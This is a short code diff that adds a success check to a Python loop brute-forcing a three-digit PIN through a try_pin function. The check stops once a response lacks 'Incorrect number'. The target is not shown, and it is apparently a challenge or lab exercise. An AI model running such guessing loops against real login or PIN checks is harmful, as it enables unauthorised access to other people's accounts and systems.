@@ -36,3 +36,7 @@ def try_pin(pin):
 for pin in range(1000):
     response, pin_str = try_pin(pin)
     print(f"Try pin {pin_str}...")
+
+    if "Incorrect number" not in response:
+        print(f"\nFound the correct PIN: {pin_str}")
+        break
